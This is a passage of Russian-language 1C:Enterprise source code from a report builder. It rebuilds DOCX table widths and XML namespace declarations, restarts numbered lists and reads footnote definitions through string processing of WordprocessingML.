		ТекстФайлаСвязейРез = ТекстФайлаСвязейРез + ТекстФайлаСвязей;
		// сохраняем файл связей
		ПостроительОтчетовКлиентСервер.ЗаписатьТекстФайла(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьКСвязямОтчета + СтрЗаменить(НовоеИмяФайла, ""diagrams"", """") + "".rels""), ТекстФайлаСвязейРез);
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиДинамическихТаблиц

// Замена настройки ширины таблицы на динамически определяемую 
// 
// Параметры:
//  сСекцияТаблица - строка - in, строка, содержащая таблицу
//  тзТаблицаОбластей - ТаблицаЗначений - in, таблица с атрибутами и ширинами областей
//
// Возвращаемое значение:
//  строка - строка, содержащая перестроенную таблицу
// 
Функция ПереопределениеНастройкиШириныТаблицы(Знач сСекцияТаблица, тзТаблицаОбластей)
	КолвоКолонок = тзТаблицаОбластей.Скопировать(Новый Структура(""ВыводитьОбласть"", 1)).Количество();
	тзБуф = тзТаблицаОбластей.Скопировать();
	тзБуф.Свернуть( , ""ШиринаОбласти"");
	цНачало = Найти(сСекцияТаблица, ""<w:tblW"");
	цКонец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сСекцияТаблица, "">"", цНачало) + 1;
	сНастройкаШирины = Сред(сСекцияТаблица, цНачало, цКонец - цНачало);
	Если КолвоКолонок > 4 Тогда 
		Возврат СтрЗаменить(сСекцияТаблица, сНастройкаШирины, ""<w:tblW w:w=""""0"""" w:type=""""auto""""/>"");   
	Иначе 
		Возврат СтрЗаменить(сСекцияТаблица, сНастройкаШирины, ""<w:tblW w:w="""""" + СтрЗаменить(Строка(тзБуф[0].ШиринаОбласти), Символы.НПП, """") + """""" w:type=""""dxa""""/>"");
	КонецЕсли;
КонецФункции

// Создание структуры таблицы значений необходимой для перестроения таблицы
// 
// Возвращаемое значение:
// ТаблицаЗначений - пустая таблица значений с тремя колонками:
// 						   ШиринаОбласти - ширина области разметки заданая в шаблоне
// 						   ВыводитьОбласть - выводить область или нет
// 						   ФиксированнаяШирина - признак, фиксированая или нет должна быть ширина 
//												 области после перестроения
//
Функция СоздатьТаблицуОбластей()
	тзТаблицаОбластей = Новый ТаблицаЗначений;
	тзТаблицаОбластей.Колонки.Добавить(""ШиринаОбласти"");
	тзТаблицаОбластей.Колонки.Добавить(""ВыводитьОбласть"");
	тзТаблицаОбластей.Колонки.Добавить(""ФиксированнаяШирина"");
	тзТаблицаОбластей.Колонки.Добавить(""УсловиеВидимости"");
	Возврат тзТаблицаОбластей;
КонецФункции

// Формирование таблицы областей и заполнение ширин областей разметки таблицы
// 
// Параметры:
//  сРазметкаТаблицы - строка - in, строка, содержащая секцию разметки областей
//
// Возвращаемое значение:
//  ТаблицаЗначений - таблица с заполнеными ширинами областей разметки таблицы
// 
Функция ФормированиеТаблицыОбластей(сРазметкаТаблицы)
	тзТаблицаОбластей = СоздатьТаблицуОбластей();
	цНачало = Найти(сРазметкаТаблицы, ""w:w="""""");
	Пока цНачало > 0 Цикл
		цНачало = цНачало + СтрДлина(""w:w="""""");
		цКонец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сРазметкаТаблицы, """""""", цНачало);
		стзНовая = тзТаблицаОбластей.Добавить();
		стзНовая.ШиринаОбласти = Число(Сред(сРазметкаТаблицы, цНачало, цКонец - цНачало));
		стзНовая.ВыводитьОбласть = -1;
		стзНовая.ФиксированнаяШирина = -1;
		стзНовая.УсловиеВидимости = """";
		цНачало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сРазметкаТаблицы, ""w:w="""""", цКонец);
	КонецЦикла;
	Возврат тзТаблицаОбластей;
КонецФункции

// Определяем сколько областей разметки занимает столбец
// 
// Параметры:
//  сСтолбец - строка - in, строка, содержащая столбец таблицы
//
// Возвращаемое значение:
//  число - количество областей разметки, которое занимает столбец
// 
Функция ПолучитьЧислоЗанимаемыхОбластей(сСтолбец)
	цЧислоЗанимаемыхОбластей = 1;
	цНачало = Найти(сСтолбец, ""<w:gridSpan"");
	Если цНачало <> 0 Тогда
		цНачало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сСтолбец, ""w:val="""""", цНачало) + СтрДлина(""w:val="""""");
		цКонец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сСтолбец, """""""", цНачало);
		цЧислоЗанимаемыхОбластей = Число(Сред(сСтолбец, цНачало, цКонец - цНачало));
	КонецЕсли;
	Возврат цЧислоЗанимаемыхОбластей;
КонецФункции

// Построение секции разметки областей таблицы на основании атрибутов, пересчет ширин областей
// 
// Параметры:
//  тзТаблицаОбластей - ТаблицаЗначений - in, таблица с атрибутами и ширинами областей
//
// Возвращаемое значение:
//  строка - содержащая перестроенную секцию разметки таблицы
// 
Функция ПостроениеРазметкиОбластейТаблицы(тзТаблицаОбластей)
	сРазметкаОбластей = ""<w:tblGrid>"";
	цОсвободившеесяПространство = 0;
	цКоличествоДинамическихСтолбцов = 0;
	цКоличествоСкрываемыхСтолбцов = 0;
	// бежим по таблице областей и определяем количество динамических областей, 
	// количество скрываемых областей и освободившееся пространство таблицы
	Для Каждого стзОбласть Из тзТаблицаОбластей Цикл
		Если стзОбласть.ВыводитьОбласть <> 0 Тогда
			Если стзОбласть.ФиксированнаяШирина <> 1 Тогда
				цКоличествоДинамическихСтолбцов = цКоличествоДинамическихСтолбцов + 1;
			КонецЕсли;
		Иначе
			цКоличествоСкрываемыхСтолбцов = цКоличествоСкрываемыхСтолбцов + 1;
			цОсвободившеесяПространство = цОсвободившеесяПространство + стзОбласть.ШиринаОбласти;
		КонецЕсли;
	КонецЦикла;
	// если скрываются все области, то выдаем ошибку
	Если тзТаблицаОбластей.Количество() = цКоличествоСкрываемыхСтолбцов Тогда
		ВызватьИсключение ""Ошибка шаблона отчета. В динамической таблице все столбцы не могут быть скрыты."";
	КонецЕсли;
	// бежим по таблице областей, пересчитываем ширины динамических областей и формируем секцию разметки 
	Для Каждого стзОбласть Из тзТаблицаОбластей Цикл
		текШиринаОбласти = стзОбласть.ШиринаОбласти;
		Если стзОбласть.ВыводитьОбласть <> 0 Тогда
			Если стзОбласть.ФиксированнаяШирина <> 1 Тогда
				цДобавляемаяШирина = Цел(цОсвободившеесяПространство / цКоличествоДинамическихСтолбцов);
				текШиринаОбласти = текШиринаОбласти + цДобавляемаяШирина;
				цОсвободившеесяПространство = цОсвободившеесяПространство - цДобавляемаяШирина;
				цКоличествоДинамическихСтолбцов = цКоличествоДинамическихСтолбцов - 1;
			КонецЕсли;
			сРазметкаОбластей = сРазметкаОбластей + ""<w:gridCol w:w="""""" + Формат(текШиринаОбласти, ""ЧГ="") + """"""/>"";
		КонецЕсли;
	КонецЦикла;
	Возврат сРазметкаОбластей + ""</w:tblGrid>"";
КонецФункции

// Вырезает теги задающие высоту ячееек
//
// Параметры:
//  сСекцияТаблица - строка - содержащая текст таблицы
//
Процедура АвтоВысотаТаблицы(сСекцияТаблица)
	цНач = Найти(сСекцияТаблица, ""<w:trPr>"");
	Пока Не цНач = 0 Цикл
		цКон = Найти(сСекцияТаблица, ""</w:trPr>"");
		сСекцияТаблица = Лев(сСекцияТаблица, цНач - 1) + Сред(сСекцияТаблица, цКон + СтрДлина(""</w:trPr>""));
		цНач = Найти(сСекцияТаблица, ""<w:trPr>"");
	КонецЦикла;
КонецПроцедуры

// Перестроение ячейки таблицы (пересчет ширины столбца, пересчет 
// количества занимаемых областей, скрываем ячейки, занимающие 0 областей)
// 
// Параметры:
//  сЯчейка - строка - текст, содержащий секцию
//  тзТаблицаОбластей - ТаблицаЗначений - in, таблица с атрибутами и ширинами областей
//  цПерваяОбласть - число - in, номер первой области, которую накрывает ячейка
//  цПоследняяОбласть - число - in, номер последней области, которую накрывает ячейка
//
// Возвращаемое значение:
//  строка - строка, содержащая перестроенную ячейку таблицы
// 
Функция ПерестроениеЯчейки(сЯчейка, тзТаблицаОбластей, цПерваяОбласть, цПоследняяОбласть)
	сНоваяЯчейка = """";
	// определяем сколько областей разметки занимает столбец
	цЧислоЗанимаемыхОбластей = цПоследняяОбласть - цПерваяОбласть + 1;
	цШиринаСтолбца = 0;
	// определяем сколько областей должен занимать столбец
	цНомерОбласти = цПерваяОбласть; 
	Пока цНомерОбласти <= цПоследняяОбласть Цикл
		Если тзТаблицаОбластей[цНомерОбласти].ВыводитьОбласть = 0 Тогда
			цЧислоЗанимаемыхОбластей = цЧислоЗанимаемыхОбластей - 1;
		Иначе
			цШиринаСтолбца = цШиринаСтолбца + тзТаблицаОбластей[цНомерОбласти].ШиринаОбласти;
		КонецЕсли;
		цНомерОбласти = цНомерОбласти + 1;
	КонецЦикла;
	
	// переопределяем число занимаемых областей и пересчитывем ширину 
	// если ячейка занимает ноль областей, то выводить ее не нужно
	Если цЧислоЗанимаемыхОбластей <> 0 Тогда
		цНачало = Найти(сЯчейка, ""<w:gridSpan"");
		// если для столбца был задан тэг количества занимаемых областей, то переопределяем его
		Если цНачало <> 0 Тогда
			цКонец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сЯчейка, "">"", цНачало);
			сЧислоЗанимаемыхОбластей = Сред(сЯчейка, цНачало, цКонец - цНачало + 1);
			сНоваяЯчейка = СтрЗаменить(сЯчейка, сЧислоЗанимаемыхОбластей, ""<w:gridSpan w:val="""""" + Строка(цЧислоЗанимаемыхОбластей) + """"""/>"");
		ИначеЕсли цЧислоЗанимаемыхОбластей = 1 Тогда
			// если для столбца не был задан тэг количества занимаемых областей, 
			// то оставляем без изменений, т.к. количество областей увеличиться не может
        	сНоваяЯчейка = сЯчейка;
		КонецЕсли;
		// переопределяем ширину ячейки
		цНачало = Найти(сНоваяЯчейка, ""<w:tcW"");
		Если цНачало <> 0 Тогда
			цКонец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сНоваяЯчейка, "">"", цНачало);
			сШиринаЯчейки = Сред(сНоваяЯчейка, цНачало, цКонец - цНачало + 1);
			Если сШиринаЯчейки <> ""<w:tcW w:w=""""0"""" w:type=""""auto""""/>"" Тогда
				сНоваяЯчейка = СтрЗаменить(сНоваяЯчейка, сШиринаЯчейки,	""<w:tcW w:w="""""" + СтрЗаменить(Строка(цШиринаСтолбца), Символы.НПП, """") + """""" w:type=""""dxa""""/>"");
			КонецЕсли;								
		КонецЕсли;
	КонецЕсли;
	Возврат сНоваяЯчейка;
КонецФункции

// Обрабатывает секции ""ячейка"": вырезает или оставляет, меняет атрибуты в зависимости от видимости колонок
// 
// Параметры:
//  СтруктШаблон - массив - шаблон отчета во внутренней структуре (или его фрагмент) 
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
// Возвращаемое значение:
//  массив - шаблон отчета во внутренней структуре (или его фрагмент)
//
Функция ОбработкаСекцийЯчейкаВДТ(СтруктШаблон, Контекст)
	Если ТипЗнч(СтруктШаблон) = Тип(""Строка"") Тогда
		Возврат СтруктШаблон;
	КонецЕсли;
	
	мРез = Новый Массив;
	
	Для Каждого Элем Из СтруктШаблон Цикл 
		Если ТипЗнч(Элем) = Тип(""Строка"") Тогда
			мРез.Добавить(Элем);
		ИначеЕсли Элем.цТипСекции = констЯчейка() Тогда 
			Если ТипЗнч(Элем.СодержимоеСекции) = Тип(""Строка"") Тогда 
				НовЯчейка = ПерестроениеЯчейки(Элем.СодержимоеСекции, Контекст.ТаблицаОбластей,	Число(Элем.сНаименованиеСекции), Число(Элем.сДанные));
												
				Если Не ПустаяСтрока(НовЯчейка) Тогда 
					мРез.Добавить(НовЯчейка);
				КонецЕсли;
			Иначе // массив, в котором первый (нулевой) элемент обязательно строка
				НовЯчейка = ПерестроениеЯчейки(Элем.СодержимоеСекции[0], Контекст.ТаблицаОбластей, Число(Элем.сНаименованиеСекции), Число(Элем.сДанные));
				
				Если Не ПустаяСтрока(НовЯчейка) Тогда 
					мРез.Добавить(НовЯчейка);
					Для Сч = 1 По Элем.СодержимоеСекции.ВГраница() Цикл 
						мРез.Добавить(Элем.СодержимоеСекции[Сч]);
					КонецЦикла;
				КонецЕсли;
			КонецЕсли;
		Иначе
			НовСекция = Новый Структура;
			Для Каждого КлючЗнач Из Элем Цикл
				НовСекция.Вставить(КлючЗнач.Ключ, КлючЗнач.Значение);
			КонецЦикла;
			НовСекция.СодержимоеСекции = ОбработкаСекцийЯчейкаВДТ(НовСекция.СодержимоеСекции, Контекст);
			мРез.Добавить(НовСекция);
		КонецЕсли;
	КонецЦикла;
	
	Возврат мРез;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиXMLСхем

// Считывание определния xml-схем документа в структуру (ключ - URL, значение - псевдоним)
// 
// Параметры:
//  сТекст - строка - in, текст
//
// Возвращаемое значение:
//  структура - структура, содержащая xml-схемы документа (ключ - URL, значение - псевдоним)
//
Функция ПолучитьОпределениеXMLСхем(сТекст, сТег)
	XMLСхемы = Новый ТаблицаЗначений;
	XMLСхемы.Колонки.Добавить(""Псевдоним"");
	XMLСхемы.Колонки.Добавить(""ПространствоИмен"");
	ИгнорируемыеXMLСхемы = Новый ТаблицаЗначений;
	ИгнорируемыеXMLСхемы.Колонки.Добавить(""Псевдоним"");
	ИгнорируемыеXMLСхемы.Колонки.Добавить(""ИгнорируемыеСхемы"");
	
	НачалоДокумента = Найти(сТекст, ""<w:"" + сТег + "" "");
	Если НачалоДокумента > 0 Тогда
		НачалоДокумента = НачалоДокумента + СтрДлина(сТег) + 4;
		КонецДокумента = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, "">"", НачалоДокумента);
		Схемы = Сред(сТекст, НачалоДокумента, КонецДокумента - НачалоДокумента);
		// получаем схемы документа
		Начало = Найти(Схемы, ""xmlns:"");
		Пока Начало > 0 Цикл
			НовСтр = XMLСхемы.Добавить();
			Начало = Начало + 6;
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Схемы, ""="""""", Начало);
			НовСтр.Псевдоним = Сред(Схемы, Начало, Конец - Начало);
			Начало = Конец + 2;
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Схемы, """""""", Начало);
			НовСтр.ПространствоИмен = Сред(Схемы, Начало, Конец - Начало);
			Начало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Схемы, ""xmlns:"", Конец + 1);
		КонецЦикла;
		// получаем игнорируемые схемы документа
		Конец = Найти(Схемы, "":Ignorable="""""");
		Пока Конец > 0 Цикл
			НовСтр = ИгнорируемыеXMLСхемы.Добавить();
			Начало = ПостроительОтчетовКлиентСервер.НайтиСправа(Схемы, "" "", Конец) + 1;
			НовСтр.Псевдоним = Сред(Схемы, Начало, Конец - Начало);
			Начало = Конец + 12;
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Схемы, """""""", Начало);
			НовСтр.ИгнорируемыеСхемы = СтрРазделить(Сред(Схемы, Начало, Конец - Начало), "" "", Ложь);
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Схемы, "":Ignorable="""""", Конец + 1);
		КонецЦикла;
	КонецЕсли;
	
	Возврат Новый Структура(""XMLСхемы, ИгнорируемыеXMLСхемы"", XMLСхемы, ИгнорируемыеXMLСхемы);
КонецФункции

// Считывание XML-схем файлов документа
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура СчитатьОпределениеXMLСхем(Контекст)
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.ТекстШаблона, Контекст.XMLСхемыДокумента, ""document"");
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.СтилиДокумента, Контекст.XMLСхемыСтилей, ""styles"");
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.ОпределениеСписков, Контекст.XMLСхемыСписков, ""numbering"");
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.Сноски, Контекст.XMLСхемыСносок, ""footnotes"");
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.КонцевыеСноски, Контекст.XMLСхемыКонцевыхСносок, ""endnotes"");
	ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.Примечания, Контекст.XMLСхемыПримечаний, ""comments"");
КонецПроцедуры
	
// Вырезает откывающий тэг документа из текста шаблона, считывает xml-схемы и помещает их в Контекст
//
// Параметры:
//  сТекст - строка - in out, текст файла
//  XMLСхемы - структура - out, для сохранения XML-схем
//  Тег - строка - in, имя тега, в котором определены XML-схемы
//
Процедура ВырезатьОпределениеXMLСхем(сТекст, XMLСхемы, сТег)
	Если ЗначениеЗаполнено(сТекст) Тогда
		НачалоДокумента = Найти(сТекст, ""<w:"" + сТег + "" "");
		Если НачалоДокумента > 0 Тогда
			КонецДокумента = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, "">"", НачалоДокумента + 12);
			ОпределениеТега = Сред(сТекст, НачалоДокумента, КонецДокумента - НачалоДокумента + 1);
			XMLСхемы = ПолучитьОпределениеXMLСхем(ОпределениеТега, сТег);
			сТекст = Лев(сТекст, НачалоДокумента - 1) + ""<w:"" + сТег + ""<ОпределениеСхем>"" + Сред(сТекст, КонецДокумента);
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

// Переформирование XML-схем файлов документа
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ВставитьОпределениеXMLСхем(Контекст)
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.ТекстШаблона, Контекст.XMLСхемыДокумента);
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.ОпределениеСписков, Контекст.XMLСхемыСписков);
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.СтилиДокумента, Контекст.XMLСхемыСтилей);
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.Сноски, Контекст.XMLСхемыСносок);
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.КонцевыеСноски, Контекст.XMLСхемыКонцевыхСносок);
	СформироватьОпределениеXMLСхем(Контекст.ДанныеШаблона.Примечания, Контекст.XMLСхемыПримечаний);
КонецПроцедуры
	
// Формирует откывающий тэг документа и вставляет его в текст из Контекст
//
// Параметры:
//  сТекст - строка - in out, текст файла
//  XMLСхемы - структура - in, содержащая определение XML-схем
//
Процедура СформироватьОпределениеXMLСхем(сТекст, XMLСхемы)
	Если ЗначениеЗаполнено(сТекст) Тогда
		цИндексНачалаСекции = Найти(сТекст, ""<ОпределениеСхем>"");
		Если цИндексНачалаСекции > 0 Тогда
			Стр = """";
			Для Каждого Запись Из XMLСхемы.XMLСхемы Цикл
				Стр = Стр + "" xmlns:"" + Запись.Псевдоним + ""="""""" + Запись.ПространствоИмен + """""""";
			КонецЦикла;
			Для Каждого Запись Из XMLСхемы.ИгнорируемыеXMLСхемы Цикл
				Стр = Стр + "" "" + Запись.Псевдоним + "":Ignorable="""""" + СтрСоединить(Запись.ИгнорируемыеСхемы, "" "") + """""""";
			КонецЦикла;
			сТекст = Лев(сТекст, цИндексНачалаСекции - 1) + Стр + Сред(сТекст, цИндексНачалаСекции + СтрДлина(""<ОпределениеСхем>""));
		КонецЕсли;
	КонецЕсли;	
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиСписков

// Формирование таблиц для хранения определения списков и ссылок списков
//
// Параметры:
//  Контекст - структура - в которой необходимо создать таблицы
//
Процедура СформироватьТаблицыДляСписков(Контекст)
	тзОпределениеСписков = Новый ТаблицаЗначений;
	тзОпределениеСписков.Колонки.Добавить(""Текст"");
	тзСсылкиСписков = Новый ТаблицаЗначений;
	тзСсылкиСписков.Колонки.Добавить(""Текст"");
	тзСсылкиСписков.Колонки.Добавить(""Определение"");
	Контекст.Вставить(""ОпределениеСписков"", тзОпределениеСписков);
	Контекст.Вставить(""СсылкиСписков"", тзСсылкиСписков);
КонецПроцедуры

// Вырезает определение списков из текста шаблона, и помещает его в Контекст
//
// Параметры:
//  сТекст - строка - текст шаблона отчета, либа файла определения списков
//  ОпределениеСписков - таблица значений - содержит считанные определения списков
//  СсылкиСписков - таблица значений - содержит считанные ссылки списков
//
Процедура ВырезатьОпределениеСписков(сТекст, ОпределениеСписков, СсылкиСписков)
	сНачало = """";
	ОткрывающийТег = ""<w:abstractNum "";
	ЗакрывающийТег = ""</w:abstractNum>"";
	
	цИндексНачалаСекции = Найти(сТекст, ОткрывающийТег);
	Если цИндексНачалаСекции > 0 Тогда 
		сНачало = Лев(сТекст, цИндексНачалаСекции - 1);
	КонецЕсли;
	Пока цИндексНачалаСекции > 0 Цикл
		цИндексКонцаСекции = Найти(сТекст, ЗакрывающийТег) + СтрДлина(ЗакрывающийТег);
		Запись = ОпределениеСписков.Добавить();
		Запись.Текст = Сред(сТекст, цИндексНачалаСекции, цИндексКонцаСекции - цИндексНачалаСекции);
		сТекст = Сред(сТекст, цИндексКонцаСекции); 
		цИндексНачалаСекции = Найти(сТекст, ОткрывающийТег);
	КонецЦикла;
	
	ОткрывающийТег = ""<w:num "";
	ЗакрывающийТег = ""</w:num>"";
	
	цИндексНачалаСекции = Найти(сТекст, ОткрывающийТег);
	Пока цИндексНачалаСекции > 0 Цикл
		цИндексКонцаСекции = Найти(сТекст, ЗакрывающийТег) + СтрДлина(ЗакрывающийТег);
		Запись = СсылкиСписков.Добавить();
		Запись.Текст = Сред(сТекст, цИндексНачалаСекции, цИндексКонцаСекции - цИндексНачалаСекции);
		// считываем индекс определения
		цПозИндекса = Найти(Запись.Текст, ""w:val="") + СтрДлина(""w:val="") + 1;
		цПозИндексаКонец = Найти(Запись.Текст, """"""/>"");
		сИндексОпределения = Сред(Запись.Текст, цПозИндекса, цПозИндексаКонец - цПозИндекса);   
		цИндексОпределения = Число(сИндексОпределения);
		сОпределение = ОпределениеСписков[цИндексОпределения].Текст;
		сОпределениеУрез = Сред(сОпределение, Найти(сОпределение, ""/>"") + 2);
		// Записываем в таблицу ссылок урезанное определение списка
		Запись.Определение = сОпределениеУрез;
		сТекст = Сред(сТекст, цИндексКонцаСекции); 
		цИндексНачалаСекции = Найти(сТекст, ОткрывающийТег);
	КонецЦикла;      
	Если Не ПустаяСтрока(сНачало) Тогда 
		сТекст = сНачало + ""<ОпределениеСписков>"" + сТекст;
	КонецЕсли;
КонецПроцедуры

// Вырезает определение списков из текста шаблона, и помещает его в Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура СчитатьОпределениеСписков(Контекст)
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.ОпределениеСписков) Тогда
		ВырезатьОпределениеСписков(Контекст.ДанныеШаблона.ОпределениеСписков, Контекст.ОпределениеСписков, Контекст.СсылкиСписков);
	КонецЕсли;
КонецПроцедуры

// Перерабатывает текст так, чтобы в том месте где находится секция построителя <ns0:НЗ>1</ns0:НЗ>,
// нумерованный список наинался заново.
//
// Параметры:
//  сТекст - строка - текст шаблона отчета, либа файла определения списков
//  ОпределениеСписков - таблица значений - содержит считанные определения списков
//  СсылкиСписков - таблица значений - содержит считанные ссылки списков
//
Процедура РестартСписковDocx(сТекст, ОпределениеСписков, СсылкиСписков)
	НовТекст = Новый ТекстовыйДокумент;
	// ищем управляющую секцию, указывающую на необходимость рестарта списка
	ПозСекц = Найти(сТекст, ""<ns0:НЗ>1</ns0:НЗ>"");
	Пока Не (ПозСекц = 0) Цикл
		ПозКонецСекц = ПозСекц + СтрДлина(""<ns0:НЗ>1</ns0:НЗ>"");
		сНачало = Лев(сТекст, ПозСекц - 1);
		ПозСписка = ПостроительОтчетовКлиентСервер.НайтиСправа(сНачало, ""<w:numId"");
		Если ПозСписка = 0 Тогда
			// ??  а как же ошибка
			НовТекст.ДобавитьСтроку(сНачало);
			сТекст = Сред(сТекст, ПозКонецСекц); 
		Иначе
			// скинем в буфер все, что до определния списка
			НовТекст.ДобавитьСтроку(Лев(сНачало, ПозСписка - 1));
			// спозиционируемся на начало определения списка
			сНачало = Сред(сНачало, ПозСписка);
			ПозСпискаКонец = Найти(сНачало, """"""/>"");
			// считаем строку, которую надо будет менять
			сДляЗамены = Лев(сНачало, ПозСпискаКонец + 2); 
			// вычислим код списка
			ПозКода = СтрДлина(""<w:numId w:val="") + 2;
			сКодСписка = Сред(сНачало, ПозКода, ПозСпискаКонец - ПозКода);
			// а это индекс списка в нашей таблице
			цИндексСписка = Число(сКодСписка) - 1;
			// считываем определение списка
			сОпределениеСписка = СсылкиСписков[цИндексСписка].Определение;
			// генерируем новое определение списка 
			сКодОпрНов = СтрЗаменить(Строка(ОпределениеСписков.Количество()), Символы.НПП, """");
			сОпределениеСпискаНов = ""<w:abstractNum w:abstractNumId="""""" + сКодОпрНов + """"""><w:nsid w:val="""""" + сКодОпрНов + """"""/>"" + сОпределениеСписка;
			НовЗапись = ОпределениеСписков.Добавить();
			НовЗапись.Текст = сОпределениеСпискаНов;
			// генерируем новую ссылку на список
			сКодСпискаНов = СтрЗаменить(Строка(СсылкиСписков.Количество() + 1), Символы.НПП, """");
			сСсылкаСпискаНов = ""<w:num w:numId="""""" + сКодСпискаНов + """"""><w:abstractNumId w:val="""""" + сКодОпрНов + """"""/></w:num>"";
			НовЗапись = СсылкиСписков.Добавить();
			НовЗапись.Текст = сСсылкаСпискаНов;
			// записываем сюда старое опрелеление списка, так как оно здесь нужно урезанное,
			// а урезаное новое ничем не будет отличаться от старого
			НовЗапись.Определение = сОпределениеСписка;
			// генерируем строку которой будем заменять элемент списка, чтобы он опирался на добавленный список 
			сЧемЗаменять = ""<w:numId w:val="""""" + сКодСпискаНов + """"""/>"";
			// заменяем и скидываем в буфер часть до управляющей секции
			НовТекст.ДобавитьСтроку(сЧемЗаменять + Сред(сНачало, ПозСпискаКонец + 3));
			сТекст = Сред(сТекст, ПозКонецСекц);
			сТекст = СтрЗаменить(сТекст, сДляЗамены, сЧемЗаменять);
		КонецЕсли;
		// ищем управляющую секцию, указывающую на необходимость рестарта списка
		ПозСекц = Найти(сТекст, ""<ns0:НЗ>1</ns0:НЗ>"");
	КонецЦикла;
	сТекст = НовТекст.ПолучитьТекст() + сТекст;
КонецПроцедуры

// Вставляет определение списков в текст из Контекст
//
// Параметры:
//  сТекст - строка - текст шаблона отчета, либа файла определения списков
//  ОпределениеСписков - таблица значений - содержит считанные определения списков
//  СсылкиСписков - таблица значений - содержит считанные ссылки списков
//
Процедура ВставитьОпределениеСписков(сТекст, ОпределениеСписков, СсылкиСписков)
	цИндексНачалаСекции = Найти(сТекст, ""<ОпределениеСписков>"");
	Если цИндексНачалаСекции > 0 Тогда
		Рез = Новый ТекстовыйДокумент;
		Для Каждого Запись Из ОпределениеСписков Цикл
			Рез.ДобавитьСтроку(Запись.Текст);
		КонецЦикла;
		Для Каждого Запись Из СсылкиСписков Цикл
			Рез.ДобавитьСтроку(Запись.Текст);
		КонецЦикла;
		сТекст = Лев(сТекст, цИндексНачалаСекции - 1) + Рез.ПолучитьТекст() + Сред(сТекст, цИндексНачалаСекции + СтрДлина(""<ОпределениеСписков>""));
	КонецЕсли;	
КонецПроцедуры

// Вставляет определение списков в текст шаблона из Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработатьОпределениеСписков(Контекст)
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.ОпределениеСписков) Тогда
		РестартСписковDocx(Контекст.ДанныеШаблона.ТекстШаблона, Контекст.ОпределениеСписков, Контекст.СсылкиСписков);
		ВставитьОпределениеСписков(Контекст.ДанныеШаблона.ОпределениеСписков, Контекст.ОпределениеСписков, Контекст.СсылкиСписков);
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиСносок

// Считать определение сносок в текст соответствующего файла в Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура СчитатьОпределениеСносок(Контекст, КонцевыеСноски = Ложь)
	Если КонцевыеСноски Тогда
		ИмяВСтруктуре = ""КонцевыеСноски"";
		ИмяТега = ""endnote"";
	Иначе
		ИмяВСтруктуре = ""Сноски"";
		ИмяТега = ""footnote"";
	КонецЕсли;
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона[ИмяВСтруктуре]) Тогда
		Контекст[ИмяВСтруктуре] = Новый Соответствие;
		ОткрывающийТег = ""<w:"" + ИмяТега + "" "";
		ЗакрывающийТег = ""</w:"" + ИмяТега + "">"";
		ДлинаЗакрывающегоТега = СтрДлина(ЗакрывающийТег);
		
		Начало = Найти(Контекст.ДанныеШаблона[ИмяВСтруктуре], ОткрывающийТег);
		Конец = Найти(Контекст.ДанныеШаблона[ИмяВСтруктуре], ""</w:"" + ИмяТега + ""s>"");
		ОпределениеСносок = Сред(Контекст.ДанныеШаблона[ИмяВСтруктуре], Начало, Конец - Начало);
